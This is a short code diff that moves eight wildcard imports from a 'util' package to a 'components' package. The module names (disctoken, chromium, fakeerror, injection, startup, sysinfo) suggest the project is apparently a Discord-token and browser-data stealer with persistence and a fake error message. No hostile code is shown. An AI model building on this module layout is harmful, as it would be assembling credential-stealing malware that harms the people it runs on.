@@ -1,11 +1,11 @@
-from util.chromium import *
-from util.debug import *
-from util.disctoken import *
-from util.exectime import *
-from util.fakeerror import *
-from util.injection import *
-from util.startup import *
-from util.sysinfo import *
+from components.chromium import *
+from components.debug import *
+from components.disctoken import *
+from components.exectime import *
+from components.fakeerror import *
+from components.injection import *
+from components.startup import *
+from components.sysinfo import *
 
 from config import __CONFIG__
 
